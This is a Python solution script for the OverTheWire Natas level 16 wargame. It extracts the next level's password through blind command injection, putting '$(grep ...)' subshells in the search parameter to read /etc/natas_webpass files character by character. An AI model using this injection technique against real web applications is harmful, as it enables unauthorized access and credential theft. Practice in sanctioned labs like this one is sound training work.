#!/usr/bin/env python

import requests

URL = 'http://natas16.natas.labs.overthewire.org/index.php'
USERNAME = 'natas16'
PASSWORD = 'xxxxxxxxxxxxxxxxxx'
KEY = ''

CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
PRESENT = ''

for i, l in enumerate(CHARS):
    ADDON = '?needle='+'$(grep ' + l + ' ../../../../etc/natas_webpass/natas17)hackneying&submit=Search'
    r = requests.get(URL+ADDON, auth=(USERNAME, PASSWORD))
    if '\nhackneying\n' not in r.content.decode('utf-8'):
        PRESENT += l
        print("Chars available: %s" % PRESENT)

# Assume length of key the same as the other levels
for i in range(len(PASSWORD)):
    for c in PRESENT:
        ADDON = '?needle='+'$(egrep ^' + KEY + c + '.* ../../../../etc/natas_webpass/natas17)hackneying&submit=Search'
        r = requests.get(URL+ADDON, auth=(USERNAME, PASSWORD))
        if '\nhackneying\n' not in r.content.decode('utf-8'):
            KEY += c
            print("Key: %s" % KEY)
